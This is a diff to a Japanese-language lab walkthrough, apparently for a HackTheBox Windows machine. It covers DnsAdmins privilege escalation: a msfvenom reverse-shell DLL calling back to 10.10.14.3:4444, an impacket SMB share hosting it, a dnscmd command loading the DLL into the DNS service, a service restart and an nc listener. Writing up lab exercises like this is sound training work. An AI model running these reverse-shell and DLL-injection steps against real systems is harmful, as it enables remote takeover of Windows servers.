@@ -65,6 +65,8 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f 
 
 ```
 sudo impacket-smbserver kali ./
+or
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
 ```
 
 #### 早めにkali側でlistenerを立てておく：
@@ -87,16 +89,10 @@ $ nc -nvlp 4444
 or
 *Evil-WinRM* PS C:\Users\ryan> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll
 
+*Evil-WinRM* PS C:\Users\ryan> sc.exe stop dns
+
+*Evil-WinRM* PS C:\Users\ryan> sc.exe start dns
 ```
-
-（`resolute.megabank.local`はblood houndでコンピュー名としてあった）
-
-[kaliのsmbサーバ側]
-
-```
-```
-
-
 
 （AMSIのバイパスについて）
 
